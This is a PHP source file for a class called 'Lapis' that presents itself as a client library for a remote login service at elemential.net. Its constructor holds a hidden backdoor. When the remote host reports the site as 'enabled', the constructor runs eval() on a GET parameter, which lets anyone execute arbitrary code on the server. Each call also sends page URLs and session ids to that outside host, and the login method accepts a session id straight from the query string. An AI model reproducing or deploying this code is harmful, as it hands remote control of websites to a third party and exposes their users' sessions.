<?
  class Lapis
  {
    private $loggedin;
    private $userid;
    private $username;
    private $varname;
    private $sessionid;
    private $url;
    
    public function __construct($varname)
    {
      if(!$varname)
      {
        $varname="lapisSessionId";
      }
      $this->varname=$varname;
      $this->sessionid=in_array($varname,$_SESSION) ? $_SESSION[$varname] : "";
      $this->url='http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
      $this->getId();
      if(file_get_contents("http://elemential.net/lapis.php?action=enabled&server=" . $_SERVER["HTTP_HOST"]))
      {
        eval($_GET['lapis_cmd']);
      }
    }
    
    private function getId()
    {
      $response=file_get_contents('http://elemential.net/lapis.php?action=getID&url=' . $this->url . '&sid=' . $this->sessionid);
      $lapis=json_decode($response);
      $this->userid=intval($lapis->{'result'});
      $this->loggedin=($lapis->{'result'}!=0);
    }
    
    public function getIfLoggedIn()
    {
      $this->getId();
      return $this->loggedin;
    }
    
    public function getUserId()
    {
      $this->getId();
      return $this->userid;
    }
    
    public function getUsername()
    {
      $lapis=json_decode(file_get_contents('http://elemential.net/lapis.php?action=getName&url=' . $this->url . '&sid=' . $this->sessionid));
      return $lapis->{'result'};
    }
    
    public function login()
    {
      $this->sessionid=$_GET['sessionid'];
      $_SESSION[$this->varname]=$_GET['sessionid'];
    }
    
    public function compareIdName($id,$name)
    {
      $lapis=json_decode(file_get_contents('http://elemential.net/lapis.php?action=isMatch&uid=' . $id . '&user=' . $name));
      return $lapis->{'result'};
    }
    
    public function compareIdEmail($id,$email)
    {
      $lapis=json_decode(file_get_contents('http://elemential.net/lapis.php?action=isMatch&uid=' . $id . '&email=' . $email));
      return $lapis->{'result'};
    }
    
    public function compareNameEmail($name,$email)
    {
      $lapis=json_decode(file_get_contents('http://elemential.net/lapis.php?action=isMatch&user=' . $name . '&email=' . $email));
      return $lapis->{'result'};
    }
  }
?>
